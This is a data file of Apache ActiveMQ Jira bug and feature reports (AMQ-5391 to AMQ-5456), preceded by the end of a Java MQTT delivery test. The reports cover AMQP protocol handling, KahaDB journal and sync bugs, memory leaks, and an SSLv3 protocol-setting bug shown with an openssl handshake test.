connectionPub.connect();        BlockingConnection connectionSub = mqttSub.blockingConnection();        connectionSub.connect();        Topic[] topics = { new Topic("TopicA", QoS.EXACTLY_ONCE) };        connectionSub.subscribe(topics);        for (int i = 0; i < messagesPerRun; ++i) {            connectionPub.publish(topics[0].name().toString(), payload, QoS.AT_LEAST_ONCE, false);        }        int received = 0;        for (int i = 0; i < messagesPerRun; ++i) {            Message message = connectionSub.receive(5, TimeUnit.SECONDS);            assertNotNull(message);            received++;            assertTrue(Arrays.equals(payload, message.getPayload()));            message.ack();        }        connectionSub.disconnect();        for (int j = 0; j < numberOfRuns; j++) {            for (int i = 0; i < messagesPerRun; ++i) {                connectionPub.publish(topics[0].name().toString(), payload, QoS.AT_LEAST_ONCE, false);            }                        System.out.println("Restart broker here.....");            Thread.sleep(30000);                        connectionSub = mqttSub.blockingConnection();            connectionSub.connect();            connectionSub.subscribe(topics);            for (int i = 0; i < messagesPerRun; ++i) {                Message message = connectionSub.receive(5, TimeUnit.SECONDS);                assertNotNull(message);                received++;                assertTrue(Arrays.equals(payload, message.getPayload()));                message.ack();            }            connectionSub.disconnect();        }        assertEquals("Should have received " + (messagesPerRun * (numberOfRuns + 1)) + " messages", (messagesPerRun * (numberOfRuns + 1)), received);    }
issueID:AMQ-5391
type:New Feature
changed files:AmqpProtocolConverter.java
texts:Support for anonymous style producers in AMQP
Current AMQP implementation doesn"t provide a way to implement efficient anonymous producers.  The QPid JMS client for instance opens a new producer instance for each destination that the anonymous producer sends to.  To more efficiently handle anonymous producers we should provide a configurable node name (default as $relay) which would use the to feild of the incoming message to decide where the message is to be sent.
issueID:AMQ-5393
type:New Feature
changed files:StoreUsage.java
TempUsage.java
texts:Update disk based limits periodically
At the moment, we set store and temp limits at broker startup based on the configuration and available space. It"s possible that other artefacts such as logs can reduce available disk space so that our limits does not have effect. It"d be good to periodically check for the usable space left and adjust limits accordingly.
issueID:AMQ-5394
type:Bug
changed files:MessageDatabase.java
texts:Incorrect handling of duplicate update message commands in KahaDB can lead to broker startup errors
When using the new (in 5.10) persistJMSRedelivered option to make sure all duplicates are marked as redelivered (the activemq.xml config file used <policyEntry queue=">" persistJMSRedelivered="true"></policyEntry>), we occasionally had a broker fail to start up with the following error:2014-10-07 17:31:15,117 | ERROR | Looking for key 7 but not found in fileMap: {8=db-8.log number = 8 , length = 9132256} | org.apache.activemq.store.kahadb.disk.journal.Journal | main2014-10-07 17:31:15,117 | ERROR | Failed to start Apache ActiveMQ (&#91;broker0, null&#93;, java.io.IOException: Could not locate data file /local/temp/apache-activemq-5.10.0/data/kahadb/db-7.log) | org.apache.activemq.broker.BrokerService | mainThe root cause seems to be when KahaDB processes a "duplicate" update message command or if it processes an update message command after the message has been removed from kahadb.  The code in KahaDB logs a warning when this occurs from the following else statement and then updates the metadata location and then exits the function as shown below:...} else {            LOG.warn("Non existent message update attempt rejected. Destination: {}://{}, Message id: {}", command.getDestination().getType(), command.getDestination().getName(), command.getMessageId());        }metadata.lastUpdate = location;...It turns out that the metadata.lastUpdate = location; line should not run if we took the else branch above so the simple fix is to move that line up into the if block so that it will not run after the log warning.  Once we did that, we no longer see the broker startup errors.  Note that this log warning does not always lead to a broker startup error as it is also related to writing at the end of a transaction log file or the checkpoint timer interval so it is not simple to reproduce but we have not see the startup error once the metadata.lastUpdate line was moved to the correct location.A patch will be provided to show the change.
issueID:AMQ-5395
type:Bug
changed files:ActiveMQJMSVendor.java
texts:AmqpJMSVendor clips destination names if no prefix set
When a client populates the To field of a message but is not using destination prefix values the AmqpJMSVendor is incorrectly trimming the first two characters from the destination name.
issueID:AMQ-5396
type:Bug
changed files:RegionBroker.java
texts:Linkstealing causes deadlock when old client disconnects before link stealing adds the connection
During link stealing in progress if the old client(or connection) issues a disconnect can cause a deadlock due the order in which the locks are obtained on RegionBroker.addConnection and TransportConnection.processRemoveConneciton.
issueID:AMQ-5399
type:Bug
changed files:
texts:MQTT - out of order acks
As different QoS messages are acked at different points, we can get in the situation where broker gets message acks out of order, leading to exceptions likejavax.jms.JMSException: Unmatched acknowledge: MessageAck {commandId = 0, responseRequired = false, ackType = 2, consumerId = ID:mac.fritz.box-62188-1412945008667-1:3:-1:1, firstMessageId = null, lastMessageId = ID:mac.fritz.box-62188-1412945008667-1:2:-1:1:2, destination = topic://xxx, transactionId = null, messageCount = 1, poisonCause = null}; Expected message count (1) differs from count in dispatched-list (2)The same situation can occur in heavy load environments. The root of the problem is that we send back standard acks which should be in order. As we really ack message by message we should be using individual acks in mqtt filter.
issueID:AMQ-5400
type:Bug
changed files:
texts:Unable to keep message order using ActiveMQ-RAR
We have an application server which processes the messages using an MDB.  We are using message grouping to keep the message processing order.It seems that it is not possible to do this, because in case the onMessage signals rollback, then the queue does not block until the redelivery time, but keeps on dispatching.ActiveMQSession.java method afterRollback() @938 is triggered in this case. Which will redeliver the message by scheduling it:connection.getScheduler().executeAfterDelay(new Runnable() {                                    @Override                                    public void run() {                                        ((ActiveMQDispatcher)md.getConsumer()).dispatch(md);                                    }                                }, redeliveryDelay);The session is not blocked or otherwise stopped from processing more messages, so it does it.Setting prefetch=1 for the consumer did not helped.I have maxSessions=1 in the activationSpec.
issueID:AMQ-5401
type:Bug
changed files:AmqpProtocolConverter.java
texts:AMQP transport handling of durable consumer unsubscribe if incorrect
When a durable topic subscription unsubscribe request is handled errors can occur if the caller tries to remove an active durable subscription or the subscription does not exist.  Currently we mark the sender open with an error condition but don"t close the broker side which can lead to the client not noticing the error and attempting to complete the unsubscribe operation.
issueID:AMQ-5402
type:Improvement
changed files:AmqpWireFormat.java
AmqpProtocolConverter.java
texts:enable support for using byte values in destination type annotations
Add support for using the improved destination type annotation value support introduced in PROTON-711.This will be disabled by default for compatibility, being enabled either by the client indicating a connection property value for "x-opt-jms-mapping-version", or the wireFormat config being used to turn it on for all connections.
issueID:AMQ-5403
type:Bug
changed files:AmqpProtocolConverter.java
texts:remove extra expiration and timestamp manipulaton which will cause problems
Once the incoming AMQP message has been converted to a JMS message, there may be some further manipulation performed on the expiration and timestamp in AmqpProtocolConverter:  // Lets handle the case where the expiration was set, but the timestamp  // was not set by the client. Lets assign the timestamp now, and adjust  // the expiration.  if (message.getExpiration() != 0) {      if (message.getTimestamp() == 0) {      message.setTimestamp(System.currentTimeMillis());      message.setExpiration(message.getTimestamp() + message.getExpiration());      }  }This was added in AMQ-5002 as a workaround for a problem in some old message conversation code contributed to "proton-jms", where the JMSExpiration value was being set to the TTL value from the AMQP message when these actually have different semantics and values. That defect was since resolved via PROTON-474 for inclusion in Proton 0.8. Now that AMQ-5346 is underway, that means we are using the updated proton-jms code and the workaround must be removed otherwise it causes various issues itself: It may set a timestamp value where none existed, which could lead to addition of a creation-time field on outbound AMQP messages, whereas the Properties section of the AMQP message is meant to be immutable. When setting JMSExpiration to "new timestamp + old expiration", if the expiration was actually based on the absolute-expiry-time field of the incoming AMQP message then the new JMSExpiration value will be incorrect, much higher than actually requested and preventing the messages from expiring for years longer.
issueID:AMQ-5404
type:Bug
changed files:
texts:LevelDB files not being released after deletion
During numerous test runs we"ve seen the file system fill up (df -k) and eventually ActiveMQ failing with a short write error.  When ActiveMQ falls over the file system is freed up to its original state. Before ActiveMQ falls over we"ve tried to find the reason for the file system filling up by hunting through the directories but to no avail.  However when we do a lsof -a +L1 we can see numerous deleted LevelDB log and index files.   Does anybody know why ActiveMQ/LevelDB is not releasing these files for full clear up by the OS. This is on Red Hat Linux 6.4 ActiveMQ 5.10 Java 1.7.0_45
issueID:AMQ-5405
type:Improvement
changed files:
texts:Update the AMQP JMS client used in tests from 0.26 to 0.30
There have been two releases of now of the AMQP JMS client beyond the version we use now which fixes some known issues and adds some configuration options such as consumer prefetch which would be useful for testing.  There are some changes needed for SSL tests to work, a patch will be attached shortly.
issueID:AMQ-5406
type:Improvement
changed files:
texts:Support of jms.consumerExpiryCheck=false to avoid JMS Consumers ignoring some messages in case of out-of-synch clocks
AS IS JMS Consumer re-checks messages served to him by the Broker and ignores those appearing to be expired according to the clock on the Consumer machine.TO BE Allow Consumer to optionally disable this check and blindly trust the expirations check already performed at the Broker, according to the broker clock.RATIONALESWhen the Consumer clock is running ahead of the Broker clock by more that the time-to-live of a message, the message would be wrongly ignored by the consumer.Please notice that in a situation like this BrokerTimestampingPlugin is of no help, because it only influence the way messages sent by the Producer are handled at the broker, while the issue reported here is Consumer related.ADDITIONAL RATIONALES1 STOMP API does NOT perform expiration re-checks at the consumer (and this is good)2 .NET API already has an option as the one request here and for similar reasonsBACKGROUND DISCUSSIONHere are some snippets of the background discussion on users@activemq.apache.org list, where this request has been informally seconded by Gary Tully & Timothy Bish (thanks guys!):http://mail-archives.apache.org/mod_mbox/activemq-users/201410.mbox/%3CCANGe49ckNM-6_DiYWVTtDfgAZPJ2SJoMc3ypJF7K+VsBdoUaVA@mail.gmail.com%3Ehttp://mail-archives.apache.org/mod_mbox/activemq-users/201410.mbox/%3CCAFitrpQJK4MukyJ5yxPb=ygQnC0yV5jetgWiesxu8BqagfSScQ@mail.gmail.com%3Ehttp://mail-archives.apache.org/mod_mbox/activemq-users/201410.mbox/%3CCANGe49c0Xok732URRZKAx0__H9XVqjys_7auE5ysH0um+4fZkQ@mail.gmail.com%3Ehttp://mail-archives.apache.org/mod_mbox/activemq-users/201410.mbox/%3CCAH+vQmPtedrsomaZsvzU+eksLEm6GGeO5p=QzYPtqwB7ArvgAw@mail.gmail.com%3Ehttp://mail-archives.apache.org/mod_mbox/activemq-users/201410.mbox/%3C5447BF6F.1090103@gmail.com%3E
issueID:AMQ-5407
type:Bug
changed files:
texts:TransportConnector nio+ssl ignores transport.enabledProtocols settings
If you are using nio+ssl and try to set specific protocols (i.e. TLS and not SSLv3) for openwire and or stomp with ssl, NIO will ignore those settings and allow SSLv3 anyway.Setting specific transport protocols for activemq in my activemq.xml file:<transportConnectors><transportConnector name="openwire" uri="nio+ssl://0.0.0.0:61616?transport.enabledProtocols=TLSv1,TLSv1.1,TLSv1.2"></transportConnector><transportConnector name="stomp+ssl" uri="stomp+nio+ssl://0.0.0.0:61613?transport.enabledProtocols=TLSv1,TLSv1.1,TLSv1.2"></transportConnector>After changing this, I restarted activemq to ensure that those protocols were set correctly.With this setting in activemq.xml, activemq should not be able to do a successful SSLv3 handshake, however using s_connect with openssl, I am able to get activemq to respond with SSLv3:############ command run: openssl s_client -ssl3 -connect hostname.com:61616####################### this is what should be displayed###########CONNECTED(00000003)139975367284552:error:14094410:SSL routines:SSL3_READ_BYTES:sslv3 alert handshake failure:s3_pkt.c:1256:SSL alert number 40139975367284552:error:1409E0E5:SSL routines:SSL3_WRITE_BYTES:ssl handshake failure:s3_pkt.c:596:---no peer certificate available---No client certificate CA names sent---SSL handshake has read 7 bytes and written 0 bytes---New, (NONE), Cipher is (NONE)Secure Renegotiation IS NOT supportedCompression: NONEExpansion: NONESSL-Session:    Protocol  : SSLv3    Cipher    : 0000    Session-ID:    Session-ID-ctx:    Master-Key:    Key-Arg   : None    Krb5 Principal: None    PSK identity: None    PSK identity hint: None    Start Time: 1414003656    Timeout   : 7200 (sec)    Verify return code: 0 (ok)---############ this is what is actually shown###########CONNECTED(00000003)depth=0 CN = puppetmaster.localverify error:num=20:unable to get local issuer certificateverify return:1depth=0 CN = puppetmaster.localverify error:num=27:certificate not trustedverify return:1depth=0 CN = puppetmaster.localverify error:num=21:unable to verify the first certificateverify return:1---Certificate chain 0 s:/CN=puppetmaster.local   i:/CN=Puppet CA generated on puppetmaster.local at 2014-10-22 11:20:52 -0700---Server certificate-----BEGIN CERTIFICATE-----MIIFyzCCA7OgAwIBAgIBAjANBgkqhkiG9w0BAQsFADBRMU8wTQYDVQQDDEZQdXBwZXQgQ0EgZ2VuZXJhdGVkIG9uIHB1cHBldG1hc3Rlci5sb2NhbCBhdCAyMDE0LTEwLTIyIDExOjIwOjUyIC0wNzAwMB4XDTE0MTAyMTE4MjA1N1oXDTE5MTAyMTE4MjA1N1owHTEbMBkGA1UEAwwScHVwcGV0bWFzdGVyLmxvY2FsMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAyehXPWPLEuNkvvl0PHbz5cIbg4i7v51P0FzYfxR7sUt4455c4htfVpvEmWc1Ef5HD2MFViIAHorDMeGzNY2kAaX6xK2JVNhi8m8EJF7LC0LncN59p/DIc5XBl6fFGu8FGaEZ1wvRSOyitcsWCk5Gk8Oi8w56/xV7WVJJ1LchPV62TZbKqDT8Ah/VcfIaCCWVCAB59/kIIGPJ8eI3aLdQv3f5h89ETiTr4yLtd1xmz25qqPV2JZIh1yAGBCjBGsE6L41eyckZy9Tl1JZaDTRfOiXK6SkaK8NTNNbuXeQTGkLusxpUL+FmisiH1ikazKZkyRuA0vMyQiakgUleVtACt4x+oLJ9askf5nx36wGuHcU5kaIuy2d8cLq2CD+FKLOdH10+KiMlxCtHny4pY15LIzs3F1wjqoeLwpcoQwoM57Qnef8UNV0sQGlp/HkSxnhDwXh5mrXGLkpi11glTx4CIs7Yz8s7yC1FCvw8/wAi3oDrmSAgidZXKd0MT+PT+4PTDHbC+p2TG6noX+GnrAjhKFKWyw31ue9pUMX/X2AzExXiLFw2+zH+YsMNvHdTq4BM7G3s0tgQD3UQkWkDPk+0R3X14WDFTGUZ7oEb6Q+o/R+SE8W/rEwRw/O2tE6Xq063DyB4EYI+bVojpwtqOwyCNkbbC5aNnraUWfuXMWJBoqECAwEAAaOB4TCB3jA1BglghkgBhvhCAQ0EKFB1cHBldCBSdWJ5L09wZW5TU0wgSW50ZXJuYWwgQ2VydGlmaWNhdGUwJQYDVR0RBB4wHIIGcHVwcGV0ghJwdXBwZXRtYXN0ZXIubG9jYWwwDgYDVR0PAQH/BAQDAgWgMCAGA1UdJQEB/wQWMBQGCCsGAQUFBwMBBggrBgEFBQcDAjAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBQSS72jRveOqBkQTbLxTT2j5DWLPDAfBgNVHSMEGDAWgBRKtJ+dt+VxU6IwhHMYMAY78E7BOTANBgkqhkiG9w0BAQsFAAOCAgEATFMfxi1jFbnvTxiArZrL0RsA2mgBoU3p6gYhthmBWfzz7OscRacWx7CvBXGdKi3oc2uyNVIsazS30Yw5vcfoTqUAT9TdsDLMf10h9AYp15utK1ebZUc9OIf00+zF/IT/+CFXM9eKzgBxs6fKUKCKngI+kDYRD+h5qmAhUCeAAR9B+3kb8UV064Nlmla+x4zOZBzb+VSMWKSet/Sv4pMHusX2+ICvy0cRwwKmaVTzQVDSuTNlElYUM0xRXb10tS95j4S7MSYkKu2VHLD5F5LB8KxjhCcorwa323DnCQkywJLQ3S1UUH3recjoLeD9Huj8+EL7uEvQdloRPbS/2cWFKkJgXYc5t7yC7Dp8qKNzTuNyCOp68xunNPHh/JcS3wo4F/H7t2ve5IFnca4H/kSvLQWOQzmLfOrNhkn6ZJkqqGMozf2LHVvJpfAUV6ezR1O0i70GR3YkNIijok14WMinDOXN98VLMp0j9zWm5aBF5ChgzRFIvrvz/NbwMtawZ/QD/B+kOolfKCNku9xkQ6wrHj6GikH4GYwWzfTZmpaOE4GCDm8Axn5Ax+psLO10N4xwSxeB/zzygD4wDsQxP0kRg6lFIVQgfKmaJA07IcotCL9pM4ugQDGnWAjzBRqbvh5x37dc15C8F3fluSxC4yq5jv0EVeXooZISigG6Sr3rhpE=-----END CERTIFICATE-----subject=/CN=puppetmaster.localissuer=/CN=Puppet CA generated on puppetmaster.local at 2014-10-22 11:20:52 -0700---No client certificate CA names sent---SSL handshake has read 2474 bytes and written 322 bytes---New, TLSv1/SSLv3, Cipher is DHE-RSA-AES256-SHAServer public key is 4096 bitSecure Renegotiation IS supportedCompression: NONEExpansion: NONESSL-Session:    Protocol  : SSLv3    Cipher    : DHE-RSA-AES256-SHA    Session-ID: 5447F9BA158D679AE17BAD85A384B43C5B1EE597F7F0AAC01418156FC9E08924    Session-ID-ctx:    Master-Key: 96B8081CB3EC675CF2CDD0546435760871491908C10E36E8ECA622155FFE4CAA0F851DC95F63C2C476727EDC985B2DD7    Key-Arg   : None    Krb5 Principal: None    PSK identity: None    PSK identity hint: None    Start Time: 1414003130    Timeout   : 7200 (sec)    Verify return code: 21 (unable to verify the first certificate)---�ActiveMQ�        MaxFrameSize�������  CacheSize                                         CacheEnabledSizePrefixDisabled MaxInactivityDurationInitalDelay"TcpNoDelayEnabledMaxInactivityDurationu0TightEncodingEnabledStackTraceEnabledRemoving nio from both the stomp and openwire transport connector settings (and restarting activemq) actually removes the ability to talk over SSLv3 using the technique I posted before, however putting nio back in ignores those transport connector settings and allows SSLv3.
issueID:AMQ-5413
type:Bug
changed files:
texts:AMQP test client delivery/redelivery anomoly
Using Apache Qpid test clients qpid-send and qpid-receive ActiveMQ broker behaves differently from qpidd and I"m wondering if the difference is important.The test code command lines are:qpid-send -a "chuck; {create:always}" --connection-options {protocol:amqp1.0} --sequence yes --content-string 0qpid-receive -a chuck -m 1 --connection-options "{protocol:amqp1.0}" --print-headers yesWhen I run the tests against qpidd they send one message and receive one message every time. However against ActiveMQ 5.11 the qpid-receive does not receive the message until one of several conditions: the qpid-receive command also includes "--timeout 1" the qpid-receive command is repeated several, possibly dozens, of times.When qpidd broker is running or when activemq is running and --timeout is specified then the qpid-receive output is:chug@FJELD ~> qpid-receive -a chuck -m 1 --connection-options "{protocol:amqp1.0}" --print-headers yesProperties: {sn:1, ts:1414177685195174548, x-amqp-first-acquirer:True}0However, activemq running the client twice without the timeout and once with the timeout looks like this:chug@FJELD ~> qpid-receive -a chuck -m 1 --connection-options "{protocol:amqp1.0}" --print-headers yeschug@FJELD ~> qpid-receive -a chuck -m 1 --connection-options "{protocol:amqp1.0}" --print-headers yeschug@FJELD ~> qpid-receive -a chuck -m 1 --connection-options "{protocol:amqp1.0}" --print-headers yes --timeout 1Redelivered: trueProperties: {sn:1, ts:1414178091185765136, x-amqp-delivery-count:1}0The false receive attempts make the message look like it was already delivered, hence the Redelivered: true, first-acquirer absent and the x-amqp-delivery-count setting.Views of the protocol interactions between the brokers and clients are here:http://people.apache.org/~chug/adverb_qpid_send_receive_1/I ran the tests twice on ActiveMQ with the tcpnodelay option turned on and off but that didn"t seem to make any difference.
issueID:AMQ-5417
type:Bug
changed files:BrokerService.java
TaskRunnerFactory.java
texts:Use correct classloader in TaskRunnerFactory
TaskRunnerFactory"s default executor is initialised when the first task is executed. It"s also given the ThreadFactory object, which is used to create threads for the thread pool. The issue with this is when the first task is initiated from the vm transport in osgi environment, we can have transport connector threads for other transport executed in the wrong classpath. This could lead to various problems afterwards. There needs to be a way to provide the desired classloader for those threads
issueID:AMQ-5421
type:Bug
changed files:
texts:AbortSlowAckConsumerStratagy can cause errors due to concurrent access to internal state
When there are destinations being created and destroyed concurrently such as temp queue instances it is possible to get into a concurrent modification state during updates of the AbortSlowAckConsumerStrategy instance.
issueID:AMQ-5423
type:Bug
changed files:ProtocolConverter.java
texts:STOMP protocol converter tracks pending ACKS but doesn&#39;t remove the state once ACK&#39;d
The STOMP protocol converter tracks pending acks in order to suppress duplicate acks but it fails to properly clean up the state data once and ACK, NACK to TX completion event happens.  This results in a memory leak.
issueID:AMQ-5426
type:Bug
changed files:
texts:ActiveMQMessageConsumer could run into NPE due to concurrent access to internal state
ActiveMQMessageConsumer could run into NPE when the consumer is closing and a message arrived at the same time.Here is the stacktrace:java.lang.NullPointerExceptionat org.apache.activemq.ActiveMQMessageConsumer.ackLater(ActiveMQMessageConsumer.java:979)at org.apache.activemq.ActiveMQMessageConsumer.afterMessageIsConsumed(ActiveMQMessageConsumer.java:929)at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1323)at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:131)at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:202)at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129)at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47)at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)at java.lang.Thread.run(Thread.java:745)
issueID:AMQ-5431
type:Bug
changed files:AmqpProtocolConverter.java
texts:lack of link context when processing AMQP detach response results in NPE and stopping connection
When an AMQP 1.0 link (producer/consumer) is detached/closed by the broker with an error, clients must send a response Detach frame. If the link context was not set before the error occurred, this leads to the broker experiencing an NPE while processing the reply and then stopping the entire connection.org.apache.activemq.transport.amqp.AmqpProtocolException: Could not process AMQP commands at org.apache.activemq.transport.amqp.AmqpProtocolConverter.onFrame(AmqpProtocolConverter.java:319) at org.apache.activemq.transport.amqp.AmqpProtocolConverter.onAMQPData(AmqpProtocolConverter.java:247) at org.apache.activemq.transport.amqp.AmqpTransportFilter.onCommand(AmqpTransportFilter.java:98) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:745)Caused by: java.lang.NullPointerException at org.apache.activemq.transport.amqp.AmqpProtocolConverter.processLinkEvent(AmqpProtocolConverter.java:359) at org.apache.activemq.transport.amqp.AmqpProtocolConverter.onFrame(AmqpProtocolConverter.java:303) ... 6 more
issueID:AMQ-5436
type:Improvement
changed files:
texts:Performance Test does not cater for temporary destinations
The current version of the performance test tool does not support the use of temporary queues or topics. Consumers should be able to create one on demand, while producers should be able to send messages to a named temp destination.
issueID:AMQ-5438
type:Bug
changed files:
texts:Archiving mKahaDB log files cause broker restart
When using the following config, the broker service seems to restart every journal archive interval (30s):<persistenceAdapter>  <mKahaDB directory="${activemq.base}/data/kahadb">    <filteredPersistenceAdapters>      <filteredKahaDB queue="DLQ.>">        <persistenceAdapter>          <!-- keep small journals, and delete them when consumed -->          <kahaDB journalMaxFileLength="4mb"               archiveDataLogs="false"/>        </persistenceAdapter>      </filteredKahaDB>      <filteredKahaDB queue=">">        <persistenceAdapter>          <!-- keep larger journals, and archive them when consumed -->          <kahaDB journalMaxFileLength="32mb"               archiveDataLogs="true"/>        </persistenceAdapter>      </filteredKahaDB>      <!-- match all other destinations (topics); needed for completeness -->      <filteredKahaDB>        <persistenceAdapter>          <kahaDB enableJournalDiskSyncs="false"/>        </persistenceAdapter>      </filteredKahaDB>    </filteredPersistenceAdapters>  </mKahaDB></persistenceAdapter>The log files show the following exception:java.io.IOException: Failed to move /opt/amq-1/data/kahadb/queue#3a#2f#2f#3e/db-2.log to data-archive at org.apache.activemq.util.IOHelper.moveFile(IOHelper.java:189)[activemq-broker-5.10.0.jar:5.10.0] at org.apache.activemq.store.kahadb.disk.journal.DataFile.move(DataFile.java:84)[activemq-kahadb-store-5.10.0.jar:5.10.0] at org.apache.activemq.store.kahadb.disk.journal.Journal.forceRemoveDataFile(Journal.java:437)[activemq-kahadb-store-5.10.0.jar:5.10.0]
issueID:AMQ-5441
type:Bug
changed files:
texts:PersistanceAdapter returns all Durable Subscriptions - this does not scale at all when durable subscribers are used
In the PersistenceAdapter for the broker, you"ll see the call getDestinations() which is used (At least in MQTT) on each connect to see if the connecting client has any subscriptions.   The issue is that getDesitinations() returns all durable subscriptions.  We have an environment which has status / state which are retained, as well, each client supports 10 durable subscriptions.  With 10 K client connections this implies a dip into the DB which will return 80 bytes for each DESTINATION in the data base * 10K or 8 Meg on each connect.   This needs to be filtered in the DB query since you are not looking for other clientids.  All PersistenceAdaptors implemented have this issue. I have modified the all the DB adaptors to support a new method called getDestinations(String client_id).  I have also modified the JDBC query to support a query which is specific to a given client-id and does not need to loop through all (thousands of ) connections filtering the client_id in the code.. (see PersistenceAdapterSupport.listSubscriptions()).. I"ve also attached a JUnit test which demos the issue using derbyDb..
issueID:AMQ-5442
type:Bug
changed files:SimpleDiscoveryAgent.java
texts:NullPointerException in SimpleDiscoveryEvent on Shutdown
If startup of a broker fails when using SimpleDiscoveryAgent, then you will encounter a NullPointerException on shutdown because the TaskRunnerFactory instance is created during startup and there is no check to ensure it was created before attempting the shutdown:org.apache.activemq.network.DiscoveryNetworkConnector Could not stop service: DiscoveryNetworkConnector:NC:BrokerService&#91;...&#93;. Reason: java.lang.NullPointerException        at org.apache.activemq.transport.discovery.simple.SimpleDiscoveryAgent.stop(SimpleDiscoveryAgent.java:96)
issueID:AMQ-5444
type:Bug
changed files:PageFile.java
texts:KahaDB bug that skips doing a sync on recoveryFile
There appears to be a bug in the KahaDB PageFile.java class when attempting to sync files to disk.  If the "enableDiskSyncs" option is set to true, it looks like the code is intending to sync the recoveryFile and the writeFile.  However, it accidentally syncs the writeFile twice and fails to sync the recoveryFile.  In the method below, see the if statement towards the bottom that checks the enableDiskSyncs boolean to see the problem:private void writeBatch() throws IOException {...            if (enableDiskSyncs) {                // Sync to make sure recovery buffer writes land on disk..                if (enableRecoveryFile) {                    writeFile.sync(); // This should not be writeFile.sync!!!!!!                }                writeFile.sync();            }...The code above should have a recoveryFile.sync() on the line with the comment.
issueID:AMQ-5447
type:Bug
changed files:JDBCPersistenceAdapter.java
texts:Memory Leak after shutdown embeded broker with JDBC persistence
After shutdown embeded activemq broker with JDBC store, 2 "ActiveMQ JDBC PA Scheduled Task" is still alive.Because the 2 thread"s Thread factory is object of JDBCPersistenceAdapter"s inner class, so the object of JDBCPersistenceAdapter can be reached from the 2 threads, JDBCPersistenceAdapter has a field point to BrokerService. So the instance of BrokerService can be reached from the 2 threads.So the stopped brokerService cannot be GC.The root cause is that when stopping JDBCPersistenceAdapter, only cancelling cleanupTicket without shutdown clockDaemon, that"s why the 2 threads are still alive.According to http://activemq.apache.org/how-do-i-restart-embedded-broker.html, it"s better (more reliable) to instantiate the broker again instead of reuse old broker. So if I restart embeded broker, there will be  1 more BrokerService in memory. I think it"s memory leak.
issueID:AMQ-5450
type:Bug
changed files:
texts:mKahaDB filtered wildcard <filteredKahaDB queue="*.DLQ"> doesn&#39;t pick up myqueue.DLQ
the activemq destination map does not support prefix matching on multiple paths but you can provide multiple wildcard matches via a composite destination today using a comma separated list.In the main, "a.dlq" will match "*.dlq", but a.b.dlq needs a "*.*.dlq" - so there needs to be a match to the number of expected paths to the number of wildcards. Having extra matches is not a problem.A composite destination like ("*.DLQ,*.*.DLQ,*.*.*.DLQ")will give match FOO.DLQ, FOO.BAR.DLQ and FOO.BAR.BAR.DLQ etc.There is a problem with the match all destinations mapping, if there is no destination configured then an Any destination (with composite of Queue=">" and Topic=">" is used under the covers, it has a physical name of "0" which is > than the first character of *.DLQ" so it gets picked first in error.A workaround is to add your own default mapping for queues and topics <mKahaDB directory="${data}/kahadb" > <filteredPersistenceAdapters>   <!-- match up to 3 paths that end in .DLQ -->   <filteredKahaDB queue="*.*.*.DLQ,*.*.DLQ,*.DLQ">    <persistenceAdapter>      <kahaDB journalMaxFileLength="5kb"/>    </persistenceAdapter>  </filteredKahaDB>  <!-- match all queues, specify a wildcard dest to avoid the Any under the covers -->  <filteredKahaDB queue=">" >    <persistenceAdapter>      <kahaDB journalMaxFileLength="10kb"/>    </persistenceAdapter>  </filteredKahaDB>  <!-- match all topics, specify a wildcard dest to avoid the Any under the covers -->  <filteredKahaDB topic=">" >    <persistenceAdapter>      <kahaDB journalMaxFileLength="10kb"/>    </persistenceAdapter>  </filteredKahaDB> </filteredPersistenceAdapters></mKahaDB>rather than use a filteredKahaDB and not specify a destination, with the default "all" behaviour
issueID:AMQ-5454
type:Bug
changed files:AbstractStoreCursor.java
texts:Topic messages can&#39;t be sent to DLQ, because region destination value is null
When Topic.send is executed, the message is stored with the proper region destination. When RegionBroker.sendToDeadLetterQueue is called, for some reason the call to MessageReference node.getRegionDestinations (ln 728) is null.MessageReference is an instance of ActiveMQBlobMessage.
issueID:AMQ-5455
type:Bug
changed files:
texts:Build Failure due to missing paho dependency
Per report on the dev@ mailing list:http://activemq.2283324.n4.nabble.com/activemq-5-10-0-doesn-t-build-from-source-td4687924.html
issueID:AMQ-5456
type:Bug
changed files:AmqpProtocolConverter.java
texts:AMQP messages accepted transactionally by a consumer should retain the TransactionalState until commit/rollback
When the broker receives a disposition frame accepting a message using TransactionalState to make it part of a transaction, it sets the local message state to Accepted and settles the delivery. If the incoming disposition was not settled, this process causes a settled disposition frame to be sent to the client which contains a non-transactional Accepted outcome. The message has not yet actually reached this state (only doing so if the transaction is committed successfully) and so should still have a TransactionalState linking it to the transaction.This issue can be seen in the protocol trace below:<TCP time="10:05:17.783758" seqno="732965115" size="38">  <source host="127.0.0.1" port="57536"/>  <target host="127.0.0.1" port="5672"/>    <frame size="38" doff="2" chan="1">         <small-descriptor code="0x0:0x15"/> # disposition    <list8 size="25" count="5"> # disposition      <true/> # role      <uint0/> # first      <uint0/> # last      <false/> # settled      <small-descriptor code="0x0:0x34"/> # state    <<<<<< transactional state      <list8 size="15" count="2"> # state        <bin8 size="8"> # txn-id          00 00 00 00 00 00 00 01         </bin8>        <small-descriptor code="0x0:0x24"/> # outcome        <list0/> # accepted      </list8>      # <null/> batchable [false]    </list8>      </frame>  </TCP><TCP time="10:05:17.785657" seqno="1813532080" size="22">  <source host="127.0.0.1" port="5672"/>  <target host="127.0.0.1" port="57536"/>    <frame size="22" doff="2" chan="1">         <small-descriptor code="0x0:0x15"/> # disposition    <list8 size="9" count="5"> # disposition      <false/> # role      <uint0/> # first      <uint0/> # last      <true/> # settled      <small-descriptor code="0x0:0x24"/> # state    <<<<<< non-transactional state      <list0/> # accepted      # <null/> batchable [false]    </list8>      </frame>  </TCP>
issueID:AMQ-5457
type:Bug
changed files:
